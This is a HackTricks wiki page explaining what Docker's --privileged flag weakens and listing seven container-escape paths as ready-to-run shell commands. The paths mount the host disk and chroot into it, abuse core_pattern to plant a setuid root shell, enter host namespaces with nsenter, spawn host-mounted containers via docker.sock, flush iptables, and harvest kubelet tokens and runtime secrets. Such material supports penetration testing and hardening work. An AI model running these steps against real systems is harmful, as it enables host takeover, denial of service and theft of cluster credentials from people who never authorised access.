---
title: "Privileged Containers"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/linux-hardening/containers-namespaces/container-security/privileged-containers.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: container
---

`--privileged` Containers

## Overview

A container started with `--privileged` is not the same thing as a normal container with one or two extra permissions. In practice, `--privileged` removes or weakens several of the default runtime protections that normally keep the workload away from dangerous host resources. The exact effect still depends on the runtime and host, but for Docker the usual result is:

- all capabilities are granted
- the device cgroup restrictions are lifted
- many kernel filesystems stop being mounted read-only
- default masked procfs paths disappear
- seccomp filtering is disabled
- AppArmor confinement is disabled
- SELinux isolation is disabled or replaced with a much broader label

The important consequence is that a privileged container usually does **not** need a subtle kernel exploit. In many cases it can simply interact with host devices, host-facing kernel filesystems, or runtime interfaces directly and then pivot into a host shell.

## What `--privileged` Does Not Automatically Change

`--privileged` Does Not Automatically Change
`--privileged` does **not** automatically join the host PID, network, IPC, or UTS namespaces. A privileged container can still have private namespaces. That means some escape chains require an extra condition such as:

- a host bind mount
- host PID sharing
- host networking
- visible host devices
- writable proc/sys interfaces

Those conditions are often easy to satisfy in real misconfigurations, but they are conceptually separate from `--privileged` itself.

## Escape Paths

### 1. Mount The Host Disk Through Exposed Devices

A privileged container usually sees far more device nodes under `/dev`. If the host block device is visible, the simplest escape is to mount it and `chroot` into the host filesystem:

```
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
If the root partition is not obvious, enumerate the block layout first:

```
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
If the practical path is to plant a setuid helper in a writable host mount rather than to `chroot`, remember that not every filesystem honors the setuid bit. A quick host-side capability check is:

```
mount | grep -v "nosuid"
```
This is useful because writable paths under `nosuid` filesystems are much less interesting for classic “drop a setuid shell and execute it later” workflows.

The weakened protections being abused here are:

- full device exposure
- broad capabilities, especially `CAP_SYS_ADMIN`

Related pages:

### 2. Mount Or Reuse A Host Bind Mount And `chroot`

`chroot`
If the host root filesystem is already mounted inside the container, or if the container can create the necessary mounts because it is privileged, a host shell is often only one `chroot` away:

```
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
If no host root bind mount exists but host storage is reachable, create one:

```
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
This path abuses:

- weakened mount restrictions
- full capabilities
- lack of MAC confinement

Related pages:

### 3. Abuse Writable `/proc/sys` Or `/sys`

`/proc/sys` Or `/sys`
One of the big consequences of `--privileged` is that procfs and sysfs protections become much weaker. That can expose host-facing kernel interfaces that are normally masked or mounted read-only.

A classic example is `core_pattern`:[\[1\]](#references)

```
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
  char buf[1];
  for (int i = 0; i < 100; i++) buf[i] = 1;
  return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Other high-value paths include:

```
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
This path abuses:

- missing masked paths
- missing read-only system paths

Related pages:

### 4. Use Full Capabilities For Mount- Or Namespace-Based Escape

A privileged container gets the capabilities that are normally removed from standard containers, including `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, and many others. That is often enough to turn a local foothold into a host escape as soon as another exposed surface exists.

A simple example is mounting additional filesystems and using namespace entry:

```
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
If host PID is also shared, the step becomes even shorter:

```
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
This path abuses:

- the default privileged capability set
- optional host PID sharing

Related pages:

### 5. Escape Through Runtime Sockets

A privileged container frequently ends up with host runtime state or sockets visible. If a Docker, containerd, or CRI-O socket is reachable, the simplest approach is often to use the runtime API to launch a second container with host access:

```
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
For containerd:

```
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
This path abuses:

- privileged runtime exposure
- host bind mounts created through the runtime itself

Related pages:

[Runtime API And Daemon Exposure](runtime-api-and-daemon-exposure.html)

### 6. Remove Network Isolation Side Effects

`--privileged` does not by itself join the host network namespace, but if the container also has `--network=host` or other host-network access, the complete network stack becomes mutable:

```
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
This is not always a direct host shell, but it can yield denial of service, traffic interception, or access to loopback-only management services.

Related pages:

### 7. Read Host Secrets And Runtime State

Even when a clean shell escape is not immediate, privileged containers often have enough access to read host secrets, kubelet state, runtime metadata, and neighboring container filesystems:

```
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
If `/var` is host-mounted or the runtime directories are visible, this can be enough for lateral movement or cloud/Kubernetes credential theft even before a host shell is obtained.

Related pages:

## Checks

The purpose of the following commands is to confirm which privileged-container escape families are immediately viable.

```
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
What is interesting here:

- a full capability set, especially `CAP_SYS_ADMIN`
- writable proc/sys exposure
- visible host devices
- missing seccomp and MAC confinement
- runtime sockets or host root bind mounts

Any one of those may be enough for post-exploitation. Several together usually mean the container is functionally one or two commands away from host compromise.

## Related Pages

## References
